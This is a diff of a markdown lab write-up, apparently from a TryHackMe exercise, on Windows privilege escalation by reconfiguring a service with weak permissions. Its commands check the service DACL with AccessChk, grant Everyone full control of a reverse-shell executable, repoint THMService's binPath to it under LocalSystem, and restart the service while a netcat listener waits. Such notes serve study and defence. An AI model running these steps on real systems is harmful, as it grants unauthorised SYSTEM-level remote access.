@@ -9,7 +9,7 @@ If the Service `DACL` allow us to Modify the Configuration of a Service we will 
 
 <br/>
 
-- We can use a Tool <b style={{ color: 'Coral' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>
+- We can use <b style={{ color: 'Coral' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>
 
 ```batch
 accesschk <file, directory, registry key, process, service, object>
@@ -17,23 +17,24 @@ accesschk <file, directory, registry key, process, service, object>
 
 ---
 
-<br/>
+## Service Analysis
 
 
 - The Group <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(SERVICE_ALL_ACCESS)</b> can Reconfigure any Service.
 
-```log
+```log {6-7}
 C:\tools\AccessChk> accesschk64.exe /accepteula
 C:\tools\AccessChk> accesschk64.exe -qlc thmservice
   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
         [...]
         [...]
   [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
-// highlight-next-line
         SERVICE_ALL_ACCESS
 ```
 
 <br/>
+
+### PAYLOAD
 
 - Generating and Transferring the **PAYLOAD**
 
@@ -52,21 +53,26 @@ C:\> icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
 <br/>
 
 
+### Modifying The Service
+
+
 - Modifying the **Service.** We chose <b style={{ color: 'Red' }}>LocalSystem</b> as it is the Highest Privileged Account available.
 
 ```powershell
 C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
-[SC] ChangingServiceConfig SUCCESS
 ```
 
 <br/>
 
-- Starting a `netcat` Listener
-- Restarting the <b style={{ color: 'MediumTurquoise' }}>THMService</b> Service
 
-```powershell
-C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
-[SC] ChangingServiceConfig SUCCESS
+### Restarting The Service
+
+- Starting a `netcat` Listener
+- Restarting the <b style={{ color: 'MediumTurquoise' }}>THMService</b> Service. <span style={{fontWeight: 'Bold'}}>[In a Normal case Scenario we would have to Wait for a Service Restart]</span>
+
+```batch
+C:\> sc stop  "THMService"
+C:\> sc start "THMService"
 ```
 
 ```bash
